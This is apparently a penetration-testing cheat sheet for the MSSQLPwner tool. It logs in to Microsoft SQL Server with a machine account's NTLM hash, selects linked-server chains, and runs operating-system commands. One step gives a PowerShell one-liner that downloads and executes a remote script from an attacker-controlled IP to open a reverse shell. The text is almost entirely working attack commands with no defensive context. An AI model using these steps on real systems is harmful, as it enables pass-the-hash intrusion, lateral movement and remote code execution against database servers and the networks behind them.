> Login and enumerate:

```
mssqlpwner '<domain>/<hostname>$'@<sql_hostname>.<domain> -hashes :<hash> -windows-auth -port 1433 interactive
```

> See what chains are available:

```
get-chain-list 
```

> Once we have a chain we want to use we can set it:

```
set-chain <chain code>
```

> Now we can execute a command to test:

```
exec "cmd /c whoami"
```

> Now we can try to get a reverse shell with run.txt:

```
exec "cmd /c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.x.x/run.txt')"
```

> If we want to run normal sql commands and enumerate tables then we can supply the parameter:

```
direct-query "<command>"
```
